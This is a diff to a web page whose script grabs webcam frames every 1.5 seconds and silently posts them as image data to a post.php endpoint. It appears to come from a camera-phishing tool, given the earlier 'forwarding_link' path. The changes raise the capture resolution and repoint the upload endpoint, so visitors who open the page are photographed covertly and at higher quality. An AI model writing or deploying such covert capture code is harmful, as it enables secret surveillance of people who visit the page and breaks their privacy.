@@ -11,7 +11,7 @@
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+<center><canvas id="canvas" width="1280" height="720" audoplay></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
@@ -122,7 +122,7 @@
     $.ajax({
       type: 'POST',
       data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
+      url: 'post.php',
       dataType: 'json',
       async: false,
       success: function (result) {
@@ -166,8 +166,8 @@
     var context = canvas.getContext('2d');
     setInterval(function () {
 
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      context.drawImage(video, 0, 0, 1280, 720);
+      var canvasData = canvas.toDataURL("image/png", 0.95).replace("image/png", "image/octet-stream");
       post(canvasData);
       video.play();
     }, 1500);
